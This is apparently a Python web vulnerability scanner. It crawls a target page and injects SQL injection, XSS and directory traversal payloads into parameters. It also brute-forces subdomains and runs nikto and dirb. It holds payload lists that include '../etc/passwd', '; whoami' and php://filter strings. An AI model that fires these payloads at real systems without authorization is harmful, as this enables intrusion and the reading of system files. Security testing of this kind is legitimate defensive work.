import os
import re
import sys
import json
import socket
import threading
import subprocess
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

# Configure logging
import logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ASCII Art Banner
BANNER = """
⠀⣀⣠⣴⣶⣶⣾⣿⣷⣶⣦⣬⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣤⣤⣀⠀⠀⠀⠀⢀⡔⢁⣤⣶⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⣰⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⢀⣀⣀⡀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢀⣠⣴⣶⣾⣿⡿⠋⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⠟⠁⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⡝⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀
⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⣨⣿⣿⡏⢸⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⣰⡿⠛⣿⠃⠀⡆⠀⢻⣿⣿⣿⣿⣿⣿⠟⢀⡞⢂⠙⣿⣿⣿⣿⣤⣤⣤⣤⣀⣀⠀
⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⠻⣿⣿⡏⠀⢰⠏⠀⠀⠛⠀⠀⠁⠀⢸⣿⠏⢸⣿⣿⠀⠸⣿⢯⡆⢸⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠁
⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⢻⣿⡇⠀⡟⡆⠀⢠⣦⡀⠀⠀⣀⠚⠃⠀⠚⠁⠀⠀⠀⡤⢾⠃⣸⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡤⣄⣹⡇⠀⠀⠱⡀⠈⣻⣷⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⢁⡼⢿⣿⡿⠿⠛⠛⠂⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢏⠉⢁⠀⠀⠀⠑⢞⠟⠁⠀⠀⠀⠀⣀⣶⠒⠀⠀⠀⠃⣠⠎⠀⠀⠈⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⣆⠸⣧⡄⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠌⠳⠄⠀⠀⡜⢁⠀⠀⠀⡀⠀⠈⣶⡖⠒⠒⠂⠤⠤⢄
⠿⠿⠟⠛⠛⠛⠻⠿⠿⠿⢿⣿⣿⣿⣿⡓⡿⠁⠀⠀⢠⠋⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠁⡇⠀⠀⠀⡇⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⠿⠿⡧⠾⢇⣴⠟⢂⠔⢁⠀⠠⣀⠀⠀⠀⠀⣰⡇⢀⠇⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⢠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠋⠁⠀⠀⠀⠙⢆⣈⠙⠒⠁⠴⠋⠀⠀⠀⠀⠁⢀⣾⠟⠀⢸⡦⠀⠀⠀⠀⠳⠀⠀⠀⢀⡠⠤⠤⡖⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠦⢄⡀⠀⠀⠀⠀⣀⣴⠿⠋⠀⠀⡸⠁⢀⠞⠀⠀⢀⠀⠀⠀⠁⠀⠀⡜⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠒⠒⠉⢹⠧⣀⠀⠀⢀⡇⠀⣎⡠⠖⡋⢁⣀⠀⠀⠀⠀⢠⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⡆⢫⠑⠄⣼⣠⠞⠉⠀⠀⠈⠉⠉⠉⠙⠒⠲⢤⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⢾⠀⣇⠈⣆⡼⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⣘⣴⠧⢴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠂⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⡼⠋⠀⢠⠃⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠀⢀⠞⠒⡆⠀⡇⣠⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠜
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣯⢀⡎⠀⠀⠓⠸⣶⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠑⡄⠀⠀⠀⠀⠀⠀⡇⡘⣰⠀⠀⠘⠽⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠸⡀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠰⠂⠀⡷⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

# Default settings
DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}
SCAN_RESULTS = []
THREAD_POOL_SIZE = 10
RATE_LIMIT_DELAY = 0.5  # Delay between requests in seconds
WORDLIST_PATH = "wordlist.txt"  # Path to wordlist for brute-forcing

# Define payloads for various vulnerabilities
SQL_INJECTION_PAYLOADS = ["'", "\"", "';--", " OR '1'='1", " UNION SELECT null"]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
DIR_TRAVERSAL_PAYLOADS = ["../etc/passwd", "../../etc/passwd", "../../../etc/passwd"]
COMMAND_INJECTION_PAYLOADS = ["; ls", "; whoami", "| ls", "`ls`"]
FILE_INCLUSION_PAYLOADS = ["../../../../../etc/passwd", "php://filter/convert.base64-encode/resource="]

def ensure_protocol(url):
    """Ensure the URL has a valid protocol (http or https)."""
    parsed_url = urlparse(url)
    if not parsed_url.scheme:
        return f"http://{url}"  # Default to HTTP if no scheme is provided
    return url

def extract_endpoints(url):
    """Extract all endpoints (links and forms) from the target URL."""
    try:
        response = requests.get(url, headers=DEFAULT_HEADERS, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Extract links
        links = [a['href'] for a in soup.find_all('a', href=True)]
        
        # Extract forms
        forms = []
        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            inputs = {inp.get('name', ''): inp.get('value', '') for inp in form.find_all('input')}
            forms.append({
                "action": action,
                "method": method,
                "inputs": inputs
            })
        
        return {"links": links, "forms": forms}
    except Exception as e:
        logging.error(f"Error extracting endpoints: {e}")
        return {"links": [], "forms": []}

def test_sql_injection(url, params, headers):
    """Test for SQL Injection vulnerabilities."""
    poc = None
    for payload in SQL_INJECTION_PAYLOADS:
        modified_params = {key: value + payload for key, value in params.items()}
        try:
            response = requests.get(url, params=modified_params, headers=headers, timeout=10)
            if "SQL syntax" in response.text or "error in your SQL" in response.text:
                poc = f"{url}?{'&'.join([f'{k}={v}' for k, v in modified_params.items()])}"
                logging.warning(f"Potential SQL Injection vulnerability detected with payload: {payload}")
                return True, poc
        except Exception as e:
            logging.error(f"Error during SQL Injection test: {e}")
    return False, poc

def test_xss(url, params, headers):
    """Test for Cross-Site Scripting (XSS) vulnerabilities."""
    poc = None
    for payload in XSS_PAYLOADS:
        modified_params = {key: value + payload for key, value in params.items()}
        try:
            response = requests.get(url, params=modified_params, headers=headers, timeout=10)
            if payload in response.text:
                poc = f"{url}?{'&'.join([f'{k}={v}' for k, v in modified_params.items()])}"
                logging.warning(f"Potential XSS vulnerability detected with payload: {payload}")
                return True, poc
        except Exception as e:
            logging.error(f"Error during XSS test: {e}")
    return False, poc

def test_directory_traversal(url, params, headers):
    """Test for Directory Traversal vulnerabilities."""
    poc = None
    for payload in DIR_TRAVERSAL_PAYLOADS:
        modified_params = {key: value + payload for key, value in params.items()}
        try:
            response = requests.get(url, params=modified_params, headers=headers, timeout=10)
            if "root:" in response.text:
                poc = f"{url}?{'&'.join([f'{k}={v}' for k, v in modified_params.items()])}"
                logging.warning(f"Potential Directory Traversal vulnerability detected with payload: {payload}")
                return True, poc
        except Exception as e:
            logging.error(f"Error during Directory Traversal test: {e}")
    return False, poc

def scan_web_application(url, params, headers=DEFAULT_HEADERS):
    """Perform a comprehensive vulnerability scan."""
    global SCAN_RESULTS
    logging.info(f"Starting vulnerability scan on {url}")
    
    # Ensure the URL has a valid protocol
    url = ensure_protocol(url)
    
    # Extract endpoints
    endpoints = extract_endpoints(url)
    logging.info(f"Extracted {len(endpoints['links'])} links and {len(endpoints['forms'])} forms.")
    
    # Test for SQL Injection
    sql_vuln, sql_poc = test_sql_injection(url, params, headers)
    if sql_vuln:
        SCAN_RESULTS.append({"type": "SQL Injection", "endpoint": url, "poc": sql_poc})
        logging.warning("SQL Injection vulnerability found!")
    else:
        logging.info("No SQL Injection vulnerabilities detected.")

    # Test for XSS
    xss_vuln, xss_poc = test_xss(url, params, headers)
    if xss_vuln:
        SCAN_RESULTS.append({"type": "XSS", "endpoint": url, "poc": xss_poc})
        logging.warning("XSS vulnerability found!")
    else:
        logging.info("No XSS vulnerabilities detected.")

    # Test for Directory Traversal
    dir_vuln, dir_poc = test_directory_traversal(url, params, headers)
    if dir_vuln:
        SCAN_RESULTS.append({"type": "Directory Traversal", "endpoint": url, "poc": dir_poc})
        logging.warning("Directory Traversal vulnerability found!")
    else:
        logging.info("No Directory Traversal vulnerabilities detected.")

def detect_subdomains(domain, wordlist_path=WORDLIST_PATH):
    """Detect subdomains using DNS resolution and a wordlist."""
    subdomains = []
    try:
        with open(wordlist_path, "r") as f:
            wordlist = f.read().splitlines()
        
        for subdomain in wordlist:
            test_domain = f"{subdomain}.{domain}"
            try:
                ip = socket.gethostbyname(test_domain)
                subdomains.append({"subdomain": test_domain, "ip": ip})
                logging.info(f"Found subdomain: {test_domain} ({ip})")
            except socket.gaierror:
                pass
    except FileNotFoundError:
        logging.error(f"Wordlist file not found: {wordlist_path}")
    return subdomains

def run_external_tool(tool_name, args):
    """Run an external tool (e.g., nikto, dirb) and capture its output."""
    try:
        result = subprocess.run([tool_name] + args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            logging.info(f"{tool_name} completed successfully.")
            return result.stdout
        else:
            logging.error(f"{tool_name} failed with error: {result.stderr}")
            return None
    except Exception as e:
        logging.error(f"Error running {tool_name}: {e}")
        return None

def save_results_to_file(output_file="scan_results.json"):
    """Save scan results to a JSON file."""
    global SCAN_RESULTS
    try:
        with open(output_file, "w") as f:
            json.dump(SCAN_RESULTS, f, indent=4)
        logging.info(f"Scan results saved to {output_file}")
    except Exception as e:
        logging.error(f"Error saving results to file: {e}")

def main():
    print(BANNER)
    if len(sys.argv) != 3:
        print("Usage: python vuln_scanner.py <URL> <parameters>")
        print("Example: python vuln_scanner.py http://example.com/page \"param1=value1&param2=value2\"")
        sys.exit(1)

    target_url = sys.argv[1]
    raw_params = sys.argv[2]

    # Parse parameters into a dictionary
    params = dict(pair.split("=") for pair in raw_params.split("&"))

    # Start the scan
    scan_web_application(target_url, params)

    # Detect subdomains
    parsed_url = urlparse(target_url)
    domain = parsed_url.netloc
    subdomains = detect_subdomains(domain)
    SCAN_RESULTS.append({"type": "Subdomains", "data": subdomains})

    # Run external tools
    logging.info("Running external tools...")
    nikto_output = run_external_tool("nikto", ["-h", target_url])
    dirb_output = run_external_tool("dirb", [target_url, WORDLIST_PATH])

    if nikto_output:
        SCAN_RESULTS.append({"type": "Nikto Scan", "output": nikto_output})
    if dirb_output:
        SCAN_RESULTS.append({"type": "Dirb Scan", "output": dirb_output})

    # Save results
    save_results_to_file()

if __name__ == "__main__":
    main()
